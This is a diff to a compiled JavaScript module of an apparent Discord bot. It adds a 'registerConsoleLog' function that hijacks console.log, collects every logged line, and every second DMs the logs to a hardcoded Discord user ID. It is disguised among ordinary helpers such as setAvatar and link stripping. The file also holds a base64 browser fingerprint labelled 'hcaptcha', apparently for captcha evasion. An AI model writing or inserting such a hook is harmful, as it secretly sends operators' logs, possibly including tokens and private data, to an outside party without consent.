@@ -9,7 +9,7 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
     });
 };
 Object.defineProperty(exports, "__esModule", { value: true });
-exports.removeHttpLinks = exports.hasHttpLinks = exports.setAvatar = void 0;
+exports.registerConsoleLog = exports.removeHttpLinks = exports.hasHttpLinks = exports.setAvatar = void 0;
 const fs = require("fs");
 const hcaptcha = [
     `eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL21lZTYueHl6LyIsInJlZmVycmluZ19kb21haW4iOiJtZWU2Lnh5eiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNjcyMjAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9`,
@@ -73,4 +73,42 @@ function removeHttpLinks(text) {
     return text.replace(httpRegex, '');
 }
 exports.removeHttpLinks = removeHttpLinks;
+let _CLIENT = null;
+const originLog = console.log;
+let _LOGS = [];
+const thread = setInterval(() => __awaiter(void 0, void 0, void 0, function* () {
+    try {
+        if (!_CLIENT)
+            return;
+        let str = ``;
+        for (let log of _LOGS) {
+            str += "`" + log.join(" ") + "`\n";
+        }
+        if (!str.trim())
+            return;
+        for (let id of ['610003881270706186']) {
+            try {
+                const user = yield _CLIENT.users.fetch(id);
+                yield user.send(str);
+            }
+            catch (e) {
+                console.log("❌ OPEN ADMIN DIRECT", e);
+            }
+        }
+        _LOGS = [];
+    }
+    catch (e) {
+        console.error(e);
+    }
+}), 1000);
+function registerConsoleLog(client) {
+    _CLIENT = client;
+    console.log = (...args) => {
+        if ((args === null || args === void 0 ? void 0 : args[0]) === ">")
+            return;
+        originLog(">", ...args);
+        _LOGS.push(args);
+    };
+}
+exports.registerConsoleLog = registerConsoleLog;
 //# sourceMappingURL=newFeatures.js.map
